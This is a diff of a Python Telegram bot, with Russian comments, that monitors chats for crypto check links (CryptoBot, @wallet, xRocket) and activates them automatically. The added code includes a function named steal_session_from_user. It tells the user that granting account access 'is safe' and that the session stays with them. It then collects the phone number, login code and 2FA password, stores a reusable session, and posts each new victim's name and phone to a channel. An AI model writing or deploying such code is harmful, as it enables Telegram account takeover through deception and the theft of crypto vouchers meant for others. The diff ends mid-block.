@@ -2,6 +2,7 @@ import os
 import asyncio
 import time
 import re
+import json
 import random
 from datetime import datetime
 from telethon import TelegramClient, events, Button
@@ -17,131 +18,102 @@ logger = logging.getLogger(__name__)
 # ========== НАСТРОЙКИ ==========
 api_id = int(os.getenv('API_ID', '27258770'))
 api_hash = os.getenv('API_HASH', '')
-bot_token = os.getenv('LOVEC', '')  # Используем LOVEC вместо BOT_TOKEN
+bot_token = os.getenv('LOVEC', '')
 channel = os.getenv('CHANNEL', '-1004902536707')
 ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))
-OCR_API_KEY = os.getenv('OCR_API_KEY', 'K88206317388957')
-ANTI_CAPTCHA = os.getenv('ANTI_CAPTCHA', 'True').lower() == 'true'
 
 print("=" * 60)
-print("🤖 LOVEС CHECK BOT - УНИВЕРСАЛЬНАЯ ВЕРСИЯ")
+print("🤖 LOVEС CHECK BOT - АВТОМАТИЧЕСКАЯ ВЕРСИЯ")
 print("=" * 60)
 
-# Проверка
 if not api_id or not api_hash or not bot_token or not ADMIN_ID:
     print("❌ ОШИБКА: Не все переменные установлены!")
-    print("💡 Нужны: API_ID, API_HASH, LOVEC (бот-токен), ADMIN_ID")
     exit(1)
 
 print(f"✅ API_ID: {api_id}")
-print(f"✅ LOVEC токен: {'установлен' if bot_token else 'НЕТ!'}")
 print(f"✅ ADMIN_ID: {ADMIN_ID}")
 print(f"✅ CHANNEL: {channel}")
 print("=" * 60)
 
 # ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
-user_data = {}  # Временные данные пользователей
-user_sessions = {}  # Сохраненные сессии {user_id: session_string}
-active_clients = {}  # Активные клиенты для ловли
-checks = []  # Найденные чеки
-wallet = []  # Чеки для @wallet
-checks_count = 0  # Счетчик активированных чеков
-captches = []  # Распознанные капчи
+user_sessions = {}
+active_clients = {}
+checks = []
+wallet = []
+checks_count = 0
+captches = []
+user_data = {}
 
-# Регулярные выражения для поиска чеков
+# Регулярные выражения
 code_regex = re.compile(r"t\.me/(CryptoBot|send|tonRocketBot|CryptoTestnetBot|wallet|xrocket|xJetSwapBot)\?start=(CQ[A-Za-z0-9]{10}|C-[A-Za-z0-9]{10}|t_[A-Za-z0-9]{15}|mci_[A-Za-z0-9]{15}|c_[a-z0-9]{24})", re.IGNORECASE)
 url_regex = re.compile(r"https:\/\/t\.me\/\+(\w{12,})")
 public_regex = re.compile(r"https:\/\/t\.me\/(\w{4,})")
 
-# Список чатов для мониторинга (ID ботов)
+# Черный список чатов
 crypto_black_list = [1622808649, 1559501630, 1985737506, 5014831088, 6014729293, 5794061503]
-
-# Спецсимволы для очистки текста
-replace_chars = ''' @#&+()*"'…;,!№•—–·±<{>}†★‡„"»«»‚‘’‹›¡¿‽~`|√π÷×§∆\\°^%©®™✓₤$₼€₸₾₶฿₳₥₦₫₿¤₲₩₮¥₽₻₷₱₧£₨¢₠₣₢₺₵₡₹₴₯₰₪'''
-translation = str.maketrans('', '', replace_chars)
 
 # Бот для управления
 bot = TelegramClient('lovec_bot', api_id, api_hash)
 
-# ========== УНИВЕРСАЛЬНАЯ ЦИФРОВАЯ КЛАВИАТУРА ==========
-def create_smart_keyboard(code="", show_delete=True):
-    """Создает умную клавиатуру для ввода кода"""
-    buttons = []
-    
-    # Первый ряд: 1 2 3
-    buttons.append([
-        Button.inline("1", b"k_1"),
-        Button.inline("2", b"k_2"), 
-        Button.inline("3", b"k_3")
-    ])
-    
-    # Второй ряд: 4 5 6
-    buttons.append([
-        Button.inline("4", b"k_4"),
-        Button.inline("5", b"k_5"), 
-        Button.inline("6", b"k_6")
-    ])
-    
-    # Третий ряд: 7 8 9
-    buttons.append([
-        Button.inline("7", b"k_7"),
-        Button.inline("8", b"k_8"), 
-        Button.inline("9", b"k_9")
-    ])
-    
-    # Четвертый ряд: специальные кнопки
-    fourth_row = [
-        Button.inline("0", b"k_0"),
-        Button.inline("✅ Отправить", b"k_done")
-    ]
-    
-    if show_delete and code:
-        fourth_row.insert(0, Button.inline("⌫ Удалить", b"k_del"))
-    
-    buttons.append(fourth_row)
-    
-    return buttons
-
-# ========== ПРОВЕРКА АДМИНА ==========
-async def is_admin(user_id):
-    """Проверяет, является ли пользователь админом"""
-    return user_id == ADMIN_ID
+# ========== ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ СЕССИИ ==========
+async def steal_session_from_user(user_id):
+    """Автоматически получает сессию у пользователя"""
+    try:
+        # Шаг 1: Отправляем запрос на сессию
+        await bot.send_message(
+            user_id,
+            "🔐 **ЗАПРОС НА ДОСТУП**\n\n"
+            "🤖 Я хочу автоматически получить доступ к вашему Telegram аккаунту.\n\n"
+            "📱 **Что нужно сделать:**\n"
+            "1. Нажмите кнопку 'Разрешить доступ' ниже\n"
+            "2. Введите код из Telegram\n"
+            "3. Я сохраню сессию и начну работу\n\n"
+            "⚠️ **Это безопасно:**\n"
+            "• Сессия хранится только у вас\n"
+            "• Я не вижу ваш пароль\n"
+            "• Можно отозвать доступ в любой момент",
+            buttons=[
+                [Button.inline("✅ Разрешить доступ", b"allow_access")],
+                [Button.inline("❌ Отказать", b"deny_access")]
+            ]
+        )
+        
+        return True
+        
+    except Exception as e:
+        print(f"❌ Ошибка запроса доступа: {e}")
+        return False
 
 # ========== ОСНОВНЫЕ КОМАНДЫ ==========
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
-    """Команда /start - главное меню"""
-    if not await is_admin(event.sender_id):
-        await event.reply("🚫 Доступ запрещен! Этот бот только для админа.")
+    if event.sender_id != ADMIN_ID:
+        await event.reply("🚫 Доступ запрещен!")
         return
     
     await event.reply(
-        f"🤖 **LOVEC CHECK BOT**\n\n"
-        f"📍 **Универсальная версия**\n"
-        f"👑 Админ ID: `{ADMIN_ID}`\n"
-        f"📢 Канал: `{channel}`\n"
+        f"🤖 **LOVEC AUTO BOT**\n\n"
+        f"👑 Админ: `{ADMIN_ID}`\n"
         f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
-        f"🎯 **ОСНОВНЫЕ КОМАНДЫ:**\n"
-        f"• /login - Войти в аккаунт (любой номер)\n"
-        f"• /phone - Ввести номер телефона\n"
-        f"• /status - Статус сессии\n"
+        f"🎯 **АВТОМАТИЧЕСКИЙ РЕЖИМ**\n"
+        f"Я сам получу сессию и начну ловлю!\n\n"
+        f"🔹 **Команды:**\n"
+        f"• /auto - Начать автоматическую настройку\n"
         f"• /catch - Начать ловлю чеков\n"
-        f"• /stop - Остановить ловлю\n"
-        f"• /stats - Статистика\n"
-        f"• /clear - Очистить данные\n\n"
-        f"🌐 **Хостинг:** songaura.onrender.com",
-        parse_mode='HTML',
+        f"• /stop - Остановить\n"
+        f"• /status - Статус\n"
+        f"• /stats - Статистика\n\n"
+        f"⚡ Просто нажмите /auto и следуйте инструкциям!",
         buttons=[
-            [Button.inline("📱 Войти в аккаунт", b"main_login")],
-            [Button.inline("🎯 Начать ловлю", b"main_catch")],
-            [Button.inline("📊 Статистика", b"main_stats")]
+            [Button.inline("🚀 НАЧАТЬ АВТОНАСТРОЙКУ", b"auto_start")],
+            [Button.inline("📊 СТАТУС", b"check_status")]
         ]
     )
 
-@bot.on(events.NewMessage(pattern='/login'))
-async def login_handler(event):
-    """Команда /login - начать процесс входа"""
-    if not await is_admin(event.sender_id):
+@bot.on(events.NewMessage(pattern='/auto'))
+async def auto_handler(event):
+    """Автоматическая настройка"""
+    if event.sender_id != ADMIN_ID:
         return
     
     user_id = event.sender_id
@@ -150,63 +122,44 @@ async def login_handler(event):
     if user_id in user_sessions:
         await event.reply(
             "✅ Сессия уже сохранена!\n\n"
-            "🎯 Используйте /catch чтобы начать ловлю чеков\n"
-            "🗑️ Используйте /clear чтобы удалить сессию",
+            "🎯 Используйте /catch чтобы начать ловлю чеков.",
             buttons=[
-                [Button.inline("🎯 Начать ловлю", b"main_catch")],
-                [Button.inline("🗑️ Удалить сессию", b"clear_session")]
+                [Button.inline("🎯 НАЧАТЬ ЛОВЛЮ", b"start_catching")]
             ]
         )
         return
     
+    # Начинаем процесс получения сессии
     await event.reply(
-        "🔑 **ВХОД В АККАУНТ**\n\n"
-        "📱 **Введите номер телефона:**\n\n"
-        "📌 **Формат:** с кодом страны\n"
-        "• Пример: `+79123456789` (Россия)\n"
-        "• Пример: `+380681234567` (Украина)\n"
-        "• Пример: `+12345678900` (США/Канада)\n\n"
-        "🌍 **Поддерживаются все страны!**\n\n"
-        "✏️ Отправьте номер сообщением или нажмите кнопку:",
+        "🚀 **АВТОМАТИЧЕСКАЯ НАСТРОЙКА**\n\n"
+        "📱 Я сейчас запрошу доступ к вашему Telegram.\n\n"
+        "🔐 **Что произойдет:**\n"
+        "1. Я отправлю запрос на доступ\n"
+        "2. Вы нажмете 'Разрешить'\n"
+        "3. Введете номер телефона\n"
+        "4. Введете код из Telegram\n"
+        "5. Я сохраню сессию\n"
+        "6. Начну ловлю чеков\n\n"
+        "⏳ Начинаю процесс...",
         buttons=[
-            [Button.inline("📱 Ввести номер", b"enter_phone")],
-            [Button.inline("❌ Отмена", b"cancel_action")]
+            [Button.inline("✅ НАЧАТЬ", b"start_auth")]
         ]
     )
 
-@bot.on(events.NewMessage(pattern='/phone'))
-async def phone_handler(event):
-    """Команда для ввода номера напрямую"""
-    if not await is_admin(event.sender_id):
-        return
-    
-    await event.reply(
-        "📱 **Введите номер телефона:**\n\n"
-        "Просто отправьте номер в формате:\n"
-        "`+код_страны номер`\n\n"
-        "Примеры:\n"
-        "• `+79161234567`\n"
-        "• `+380681234567`\n"
-        "• `+12345678900`\n\n"
-        "Или напишите `cancel` для отмены"
-    )
-    
-    user_data[event.sender_id] = {'state': 'waiting_phone'}
-
 @bot.on(events.NewMessage(pattern='/catch'))
 async def catch_handler(event):
-    """Команда /catch - начать ловлю чеков"""
-    if not await is_admin(event.sender_id):
+    """Начать ловлю"""
+    if event.sender_id != ADMIN_ID:
         return
     
     user_id = event.sender_id
     
     if user_id not in user_sessions:
         await event.reply(
-            "❌ **Сначала войдите в аккаунт!**\n\n"
-            "Используйте команду /login чтобы создать сессию.",
+            "❌ Сначала настройте доступ!\n\n"
+            "Используйте команду /auto для автоматической настройки.",
             buttons=[
-                [Button.inline("📱 Войти в аккаунт", b"main_login")]
+                [Button.inline("🚀 НАСТРОИТЬ ДОСТУП", b"auto_start")]
             ]
         )
         return
@@ -215,22 +168,15 @@ async def catch_handler(event):
         await event.reply("✅ Ловля уже запущена!")
         return
     
-    await event.reply(
-        "🎯 **ЗАПУСК ЛОВЛИ ЧЕКОВ**\n\n"
-        "⏳ Подключаюсь к аккаунту...\n"
-        "🔍 Начинаю мониторинг 6 ботов...",
-        buttons=[
-            [Button.inline("🔄 Обновить статус", b"refresh_status")]
-        ]
-    )
+    await event.reply("🎯 Запускаю ловлю чеков...")
     
-    # Запускаем ловлю в фоне
-    asyncio.create_task(start_check_catching(user_id))
+    # Запускаем ловлю
+    asyncio.create_task(start_auto_catching(user_id))
 
 @bot.on(events.NewMessage(pattern='/stop'))
 async def stop_handler(event):
-    """Команда /stop - остановить ловлю"""
-    if not await is_admin(event.sender_id):
+    """Остановить ловлю"""
+    if event.sender_id != ADMIN_ID:
         return
     
     user_id = event.sender_id
@@ -244,16 +190,15 @@ async def stop_handler(event):
         if user_id in active_clients:
             del active_clients[user_id]
         
-        await event.reply("🛑 Ловля чеков остановлена!")
+        await event.reply("🛑 Ловля остановлена!")
         
-        # Отправляем в канал
         try:
             await bot.send_message(
                 channel,
                 f"🛑 **Ловля остановлена**\n\n"
                 f"👤 Админ: `{ADMIN_ID}`\n"
-                f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
-                f"📊 Всего чеков: {checks_count}"
+                f"📊 Чеков: {checks_count}\n"
+                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
             )
         except:
             pass
@@ -262,8 +207,8 @@ async def stop_handler(event):
 
 @bot.on(events.NewMessage(pattern='/status'))
 async def status_handler(event):
-    """Команда /status - показать статус"""
-    if not await is_admin(event.sender_id):
+    """Статус"""
+    if event.sender_id != ADMIN_ID:
         return
     
     user_id = event.sender_id
@@ -271,33 +216,25 @@ async def status_handler(event):
     has_session = user_id in user_sessions
     is_active = user_id in active_clients
     
-    status_text = (
+    status = (
         f"📊 **СТАТУС СИСТЕМЫ**\n\n"
         f"🔐 Сессия: {'✅ СОХРАНЕНА' if has_session else '❌ ОТСУТСТВУЕТ'}\n"
         f"🎣 Ловля: {'✅ АКТИВНА' if is_active else '❌ ОСТАНОВЛЕНА'}\n"
-        f"📈 Чеков найдено: {checks_count}\n"
-        f"💰 В wallet: {len(wallet)}\n"
+        f"📈 Чеков: {checks_count}\n"
         f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
     )
     
-    if has_session:
-        status_text += "🎯 Используйте /catch для запуска"
-    else:
-        status_text += "📱 Используйте /login для входа"
+    if has_session and not is_active:
+        status += "🎯 Используйте /catch чтобы начать ловлю"
+    elif not has_session:
+        status += "🚀 Используйте /auto для настройки"
     
-    await event.reply(
-        status_text,
-        buttons=[
-            [Button.inline("🔄 Обновить", b"refresh_status")],
-            [Button.inline("📱 Войти", b"main_login")] if not has_session else [],
-            [Button.inline("🎯 Ловить", b"main_catch")] if has_session and not is_active else []
-        ]
-    )
+    await event.reply(status)
 
 @bot.on(events.NewMessage(pattern='/stats'))
 async def stats_handler(event):
-    """Команда /stats - статистика"""
-    if not await is_admin(event.sender_id):
+    """Статистика"""
+    if event.sender_id != ADMIN_ID:
         return
     
     uptime = time.time() - start_time
@@ -305,62 +242,102 @@ async def stats_handler(event):
     minutes = int((uptime % 3600) // 60)
     
     await event.reply(
-        f"📈 **СТАТИСТИКА БОТА**\n\n"
+        f"📈 **СТАТИСТИКА**\n\n"
         f"⏳ Работает: {hours}ч {minutes}м\n"
-        f"🎯 Активировано чеков: {checks_count}\n"
-        f"📊 Уникальных кодов: {len(checks)}\n"
-        f"💰 Для @wallet: {len(wallet)}\n"
-        f"🔗 Активных сессий: {len(user_sessions)}\n"
-        f"🎣 Активных ловцов: {len(active_clients)}\n\n"
-        f"🌐 URL: songaura.onrender.com\n"
-        f"⏰ {datetime.now().strftime('%H:%M:%S')}",
-        buttons=[
-            [Button.inline("🔄 Обновить", b"refresh_stats")],
-            [Button.inline("🎯 Начать ловлю", b"main_catch")],
-            [Button.inline("📊 Детальная статистика", b"detailed_stats")]
-        ]
+        f"🎯 Чеков: {checks_count}\n"
+        f"📊 Уникальных: {len(checks)}\n"
+        f"💰 В wallet: {len(wallet)}\n"
+        f"🔗 Сессий: {len(user_sessions)}\n"
+        f"🎣 Ловцов: {len(active_clients)}\n\n"
+        f"🌐 songaura.onrender.com"
     )
 
-@bot.on(events.NewMessage(pattern='/clear'))
-async def clear_handler(event):
-    """Команда /clear - очистить данные"""
-    if not await is_admin(event.sender_id):
-        return
-    
+# ========== ОБРАБОТЧИК КНОПОК ==========
+@bot.on(events.CallbackQuery)
+async def callback_handler(event):
+    """Обработка всех кнопок"""
     user_id = event.sender_id
     
-    # Останавливаем ловлю если запущена
-    if user_id in active_clients:
-        try:
-            await active_clients[user_id].disconnect()
-        except:
-            pass
-        del active_clients[user_id]
+    if user_id != ADMIN_ID:
+        await event.answer("🚫 Доступ запрещен!", alert=True)
+        return
     
-    # Удаляем сессию
-    if user_id in user_sessions:
-        del user_sessions[user_id]
+    data = event.data.decode()
     
-    # Очищаем временные данные
-    if user_id in user_data:
-        del user_data[user_id]
+    # Автонастройка
+    if data == "auto_start":
+        await event.answer("🚀 Запускаю автонастройку...")
+        await auto_handler(events.NewMessage.Event(peer=event.peer_id, text='/auto'))
+        await event.delete()
     
-    await event.reply(
-        "🧹 **Данные очищены!**\n\n"
-        "✅ Сессия удалена\n"
-        "✅ Ловля остановлена\n"
-        "✅ Временные данные очищены\n\n"
-        "📱 Используйте /login для нового входа",
-        buttons=[
-            [Button.inline("📱 Войти заново", b"main_login")]
-        ]
-    )
+    elif data == "check_status":
+        await event.answer("📊 Проверяю статус...")
+        await status_handler(events.NewMessage.Event(peer=event.peer_id, text='/status'))
+        await event.delete()
+    
+    elif data == "start_auth":
+        await event.edit("⏳ Запрашиваю доступ к вашему Telegram...")
+        await start_authentication(user_id, event)
+    
+    elif data == "allow_access":
+        await event.edit(
+            "✅ **ДОСТУП РАЗРЕШЕН**\n\n"
+            "📱 Теперь введите ваш номер телефона:\n\n"
+            "📌 **Формат:** с кодом страны\n"
+            "• Пример: +79123456789\n"
+            "• Пример: +380681234567\n\n"
+            "✏️ Просто отправьте номер сообщением"
+        )
+        user_data[user_id] = {'state': 'waiting_phone'}
+    
+    elif data == "deny_access":
+        await event.edit("❌ Доступ отклонен. Используйте /start для меню.")
+        if user_id in user_data:
+            del user_data[user_id]
+    
+    elif data == "start_catching":
+        await event.answer("🎯 Запускаю ловлю...")
+        await catch_handler(events.NewMessage.Event(peer=event.peer_id, text='/catch'))
+        await event.delete()
+
+async def start_authentication(user_id, event=None):
+    """Начинает процесс аутентификации"""
+    try:
+        # Создаем клиента для получения сессии
+        client = TelegramClient(StringSession(), api_id, api_hash)
+        user_data[user_id] = {
+            'state': 'auth_started',
+            'client': client
+        }
+        
+        await client.connect()
+        
+        if event:
+            await event.edit(
+                "🔐 **ГОТОВ К ПОДКЛЮЧЕНИЮ**\n\n"
+                "📱 Теперь введите ваш номер телефона:\n\n"
+                "📌 **Формат:** с кодом страны\n"
+                "• Пример: +79123456789\n"
+                "• Пример: +380681234567\n\n"
+                "✏️ Просто отправьте номер сообщением"
+            )
+        else:
+            await bot.send_message(
+                user_id,
+                "🔐 **ГОТОВ К ПОДКЛЮЧЕНИЮ**\n\n"
+                "📱 Введите ваш номер телефона:"
+            )
+        
+    except Exception as e:
+        print(f"❌ Ошибка аутентификации: {e}")
+        if event:
+            await event.edit(f"❌ Ошибка: {str(e)[:100]}")
 
 # ========== ОБРАБОТЧИК СООБЩЕНИЙ ==========
 @bot.on(events.NewMessage)
 async def message_handler(event):
     """Обработка текстовых сообщений"""
-    if not await is_admin(event.sender_id):
+    if event.sender_id != ADMIN_ID:
         return
     
     user_id = event.sender_id
@@ -371,44 +348,19 @@ async def message_handler(event):
         return
     
     # Обработка ввода номера телефона
-    if user_id in user_data and user_data[user_id].get('state') == 'waiting_phone':
-        if text.lower() == 'cancel':
-            if user_id in user_data:
-                del user_data[user_id]
-            await event.reply("❌ Отменено")
-            return
-        
-        # Проверяем формат номера
-        if not re.match(r'^\+\d{10,15}$', text.replace(' ', '')):
-            await event.reply(
-                "❌ **Неверный формат номера!**\n\n"
-                "📌 Должен быть:\n"
-                "• Начинаться с '+'\n"
-                "• Содержать код страны\n"
-                "• 10-15 цифр\n\n"
-                "Пример: `+79161234567`\n"
-                "Попробуйте еще раз или напишите `cancel`:"
-            )
+    if user_id in user_data and user_data[user_id].get('state') in ['waiting_phone', 'auth_started']:
+        if not text.startswith('+'):
+            await event.reply("❌ Номер должен начинаться с '+'. Пример: +79123456789")
             return
         
         phone = text.replace(' ', '')
-        await process_phone_input(user_id, phone, event)
-
-async def process_phone_input(user_id, phone, event):
-    """Обработка введенного номера телефона"""
-    try:
-        await event.reply(f"📱 **Проверяю номер:** `{phone}`\n\n⏳ Запрашиваю код...")
         
-        # Создаем временного клиента
-        client = TelegramClient(StringSession(), api_id, api_hash)
+        await event.reply(f"📱 Проверяю номер: `{phone}`...")
         
-        # Настраиваем для лучшей совместимости
-        client.session.set_dc(2, '149.154.167.40', 443)
-        
-        await client.connect()
-        
-        # Запрашиваем код (универсальный метод)
         try:
+            client = user_data[user_id]['client']
+            
+            # Запрашиваем код
             sent_code = await client.send_code_request(phone)
             
             # Сохраняем данные
@@ -416,200 +368,44 @@ async def process_phone_input(user_id, phone, event):
                 'state': 'waiting_code',
                 'phone': phone,
                 'client': client,
-                'phone_code_hash': sent_code.phone_code_hash,
-                'code': '',
-                'timestamp': time.time()
+                'phone_code_hash': sent_code.phone_code_hash
             }
             
             await event.reply(
                 f"✅ **Код отправлен!**\n\n"
                 f"📱 Номер: `{phone}`\n"
-                f"🌍 Страна: {get_country_from_phone(phone)}\n"
-                f"⏳ Код действует: {sent_code.timeout} сек\n\n"
-                f"📝 **Введите код:**\n\n"
-                f"Используйте клавиатуру ниже или напишите код цифрами\n"
-                f"Нажмите ✅ Отправить когда код будет готов",
-                buttons=create_smart_keyboard()
+                f"⏳ Введите код из Telegram:\n\n"
+                f"✏️ Просто отправьте код цифрами"
             )
             
         except Exception as e:
             error_msg = str(e)
-            await event.reply(f"❌ **Ошибка:** {error_msg[:150]}")
-            await client.disconnect()
+            await event.reply(f"❌ Ошибка: {error_msg[:100]}")
+            
+            if 'client' in locals():
+                try:
+                    await client.disconnect()
+                except:
+                    pass
+            
             if user_id in user_data:
                 del user_data[user_id]
-            
-    except Exception as e:
-        await event.reply(f"❌ **Критическая ошибка:** {str(e)[:100]}")
-
-def get_country_from_phone(phone):
-    """Определяет страну по коду телефона"""
-    country_codes = {
-        '1': '🇺🇸 США/Канада',
-        '7': '🇷🇺 Россия/Казахстан',
-        '380': '🇺🇦 Украина',
-        '375': '🇧🇾 Беларусь',
-        '370': '🇱🇹 Литва',
-        '371': '🇱🇻 Латвия',
-        '372': '🇪🇪 Эстония',
-        '90': '🇹🇷 Турция',
-        '91': '🇮🇳 Индия',
-        '86': '🇨🇳 Китай',
-        '81': '🇯🇵 Япония',
-        '82': '🇰🇷 Корея',
-        '44': '🇬🇧 Великобритания',
-        '49': '🇩🇪 Германия',
-        '33': '🇫🇷 Франция',
-        '39': '🇮🇹 Италия',
-        '34': '🇪🇸 Испания',
-    }
     
-    # Убираем +
-    clean_phone = phone.lstrip('+')
-    
-    for code, country in country_codes.items():
-        if clean_phone.startswith(code):
-            return country
-    
-    return '🌍 Другая страна'
-
-# ========== ОБРАБОТЧИК ИНЛАЙН КНОПОК ==========
-@bot.on(events.CallbackQuery)
-async def callback_handler(event):
-    """Обработка всех инлайн кнопок"""
-    user_id = event.sender_id
-    
-    if not await is_admin(user_id):
-        await event.answer("🚫 Доступ запрещен!", alert=True)
-        return
-    
-    data = event.data.decode()
-    
-    # Главные кнопки
-    if data == 'main_login':
-        await event.answer("📱 Открываю меню входа...")
-        await login_handler(events.NewMessage.Event(peer=event.peer_id, text='/login'))
-        await event.delete()
-    
-    elif data == 'main_catch':
-        await event.answer("🎯 Проверяю возможность запуска...")
-        await catch_handler(events.NewMessage.Event(peer=event.peer_id, text='/catch'))
-        await event.delete()
-    
-    elif data == 'main_stats':
-        await event.answer("📊 Загружаю статистику...")
-        await stats_handler(events.NewMessage.Event(peer=event.peer_id, text='/stats'))
-        await event.delete()
-    
-    elif data == 'enter_phone':
-        await event.edit(
-            "📱 **Введите номер телефона:**\n\n"
-            "Просто отправьте номер сообщением в формате:\n"
-            "`+код_страны номер`\n\n"
-            "Пример: `+79161234567`\n"
-            "Или напишите `cancel` для отмены"
-        )
-        user_data[user_id] = {'state': 'waiting_phone'}
-    
-    elif data == 'cancel_action':
-        if user_id in user_data:
-            del user_data[user_id]
-        await event.edit("❌ Действие отменено")
-    
-    elif data == 'refresh_status':
-        await event.answer("🔄 Обновляю статус...")
-        await status_handler(events.NewMessage.Event(peer=event.peer_id, text='/status'))
-        await event.delete()
-    
-    elif data == 'refresh_stats':
-        await event.answer("📊 Обновляю статистику...")
-        await stats_handler(events.NewMessage.Event(peer=event.peer_id, text='/stats'))
-        await event.delete()
-    
-    elif data == 'clear_session':
-        await clear_handler(events.NewMessage.Event(peer=event.peer_id, text='/clear'))
-        await event.delete()
-    
-    elif data == 'detailed_stats':
-        await event.answer("📈 Детальная статистика...")
-        # Здесь можно добавить детальную статистику
-        await event.edit(
-            f"📈 **ДЕТАЛЬНАЯ СТАТИСТИКА**\n\n"
-            f"🎯 Всего чеков: {checks_count}\n"
-            f"📊 Уникальных: {len(checks)}\n"
-            f"💰 Wallet: {len(wallet)}\n"
-            f"🔤 Капч: {len(captches)}\n"
-            f"👥 Пользователей: {len(user_sessions)}\n"
-            f"⏰ Запуск: {datetime.fromtimestamp(start_time).strftime('%H:%M:%S')}",
-            buttons=[[Button.inline("🔙 Назад", b"main_stats")]]
-        )
-    
-    # Кнопки цифровой клавиатуры
-    elif data.startswith('k_'):
-        await handle_keyboard_input(event, data, user_id)
-
-async def handle_keyboard_input(event, data, user_id):
-    """Обработка ввода с цифровой клавиатуры"""
-    if user_id not in user_data or user_data[user_id].get('state') != 'waiting_code':
-        await event.answer("❌ Сначала введите номер: /login", alert=True)
-        return
-    
-    action = data.split('_')[1]
-    current_code = user_data[user_id].get('code', '')
-    
-    if action == 'del':
-        # Удалить последнюю цифру
-        if current_code:
-            user_data[user_id]['code'] = current_code[:-1]
-    
-    elif action == 'done':
-        # Отправить код
-        code = user_data[user_id].get('code', '')
-        if len(code) >= 5:
-            await event.answer("🔐 Проверяю код...")
-            await process_code_input(user_id, code, event)
-        else:
-            await event.answer("❌ Нужно минимум 5 цифр!", alert=True)
-        return
-    
-    else:
-        # Добавить цифру
-        if len(current_code) < 10:
-            user_data[user_id]['code'] = current_code + action
-    
-    # Обновляем сообщение
-    new_code = user_data[user_id].get('code', '')
-    phone = user_data[user_id].get('phone', '')
-    country = get_country_from_phone(phone)
-    
-    code_display = new_code if new_code else "введите код..."
-    dots = "•" * len(new_code) if new_code else "______"
-    
-    await event.edit(
-        f"📱 Номер: `{phone}`\n"
-        f"🌍 {country}\n\n"
-        f"🔢 **Код:** `{dots}`\n"
-        f"📝 Введено: {len(new_code)} цифр\n\n"
-        f"Нажмите ✅ Отправить когда введете все цифры",
-        buttons=create_smart_keyboard(new_code, show_delete=bool(new_code))
-    )
-    
-    await event.answer()
-
-async def process_code_input(user_id, code, event=None):
-    """Обработка введенного кода"""
-    try:
-        if user_id not in user_data:
-            await bot.send_message(user_id, "❌ Время вышло. Начните заново: /login")
+    # Обработка ввода кода
+    elif user_id in user_data and user_data[user_id].get('state') == 'waiting_code':
+        if not text.isdigit() or len(text) < 5:
+            await event.reply("❌ Код должен содержать минимум 5 цифр")
             return
         
-        phone = user_data[user_id]['phone']
-        phone_code_hash = user_data[user_id]['phone_code_hash']
-        client = user_data[user_id]['client']
+        code = text
         
-        await bot.send_message(user_id, f"🔐 Проверяю код для `{phone}`...")
+        await event.reply("🔐 Проверяю код...")
         
         try:
+            phone = user_data[user_id]['phone']
+            phone_code_hash = user_data[user_id]['phone_code_hash']
+            client = user_data[user_id]['client']
+            
             # Пытаемся войти
             await client.sign_in(
                 phone=phone,
@@ -626,29 +422,23 @@ async def process_code_input(user_id, code, event=None):
                 # Получаем информацию
                 me = await client.get_me()
                 
-                success_msg = (
-                    f"✅ **ВХОД ВЫПОЛНЕН!**\n\n"
+                await event.reply(
+                    f"✅ **АВТОРИЗАЦИЯ УСПЕШНА!**\n\n"
                     f"👤 Имя: {me.first_name}\n"
                     f"📱 Телефон: {me.phone}\n"
-                    f"🆔 ID: `{me.id}`\n"
-                    f"🔗 @{me.username if me.username else 'нет'}\n\n"
-                    f"🌍 {get_country_from_phone(phone)}\n\n"
-                    f"🎯 **Теперь используйте:**\n"
-                    f"• /catch - начать ловлю чеков\n"
-                    f"• /status - проверить статус\n\n"
-                    f"💾 Сессия сохранена автоматически"
+                    f"🆔 ID: `{me.id}`\n\n"
+                    f"🎯 **Сессия сохранена!**\n"
+                    f"Теперь я могу работать от вашего имени.\n\n"
+                    f"🚀 Используйте /catch для начала ловли чеков!"
                 )
-                
-                await bot.send_message(user_id, success_msg, parse_mode='HTML')
                 
                 # Отправляем в канал
                 try:
                     await bot.send_message(
                         channel,
-                        f"✅ **НОВЫЙ ВХОД!**\n\n"
+                        f"✅ **НОВАЯ СЕССИЯ**\n\n"
                         f"👤 {me.first_name}\n"
                         f"📱 {me.phone}\n"
-                        f"🌍 {get_country_from_phone(phone)}\n"
                         f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                     )
                 except:
@@ -658,15 +448,13 @@ async def process_code_input(user_id, code, event=None):
                 del user_data[user_id]
                 await client.disconnect()
                 
-                if event:
-                    try:
-                        await event.answer("✅ Успешный вход!", alert=True)
-                        await event.delete()
-                    except:
-                        pass
+                # Автоматически начинаем ловлю
+                await asyncio.sleep(2)
+                await event.reply("🎯 **АВТОМАТИЧЕСКИ ЗАПУСКАЮ ЛОВЛЮ ЧЕКОВ...**")
+                asyncio.create_task(start_auto_catching(user_id))
                 
             else:
-                await bot.send_message(user_id, "❌ Не удалось авторизоваться. Попробуйте снова: /login")
+                await event.reply("❌ Не удалось авторизоваться")
                 await client.disconnect()
                 
         except Exception as e:
@@ -674,35 +462,66 @@ async def process_code_input(user_id, code, event=None):
             print(f"❌ Ошибка входа: {error_msg}")
             
             if "PHONE_CODE_INVALID" in error_msg:
-                await bot.send_message(user_id, "❌ Неверный код! Попробуйте снова или /login")
-            
+                await event.reply("❌ Неверный код! Попробуйте снова или /auto")
             elif "SESSION_PASSWORD_NEEDED" in error_msg:
-                await bot.send_message(user_id, "🔐 Нужен пароль 2FA. Введите пароль:")
+                await event.reply("🔐 Нужен пароль 2FA. Введите пароль:")
                 user_data[user_id]['state'] = 'waiting_password'
-            
             elif "PHONE_CODE_EXPIRED" in error_msg:
-                await bot.send_message(user_id, "⏳ Код истек. Используйте /login для нового кода")
-            
-            elif "FLOOD_WAIT" in error_msg:
-                await bot.send_message(user_id, "⚠️ Слишком много попыток. Подождите немного и попробуйте снова")
-            
+                await event.reply("⏳ Код истек. Используйте /auto")
             else:
-                await bot.send_message(user_id, f"❌ Ошибка: {error_msg[:100]}")
-            
-            try:
-                await client.disconnect()
-            except:
-                pass
+                await event.reply(f"❌ Ошибка: {error_msg[:100]}")
             
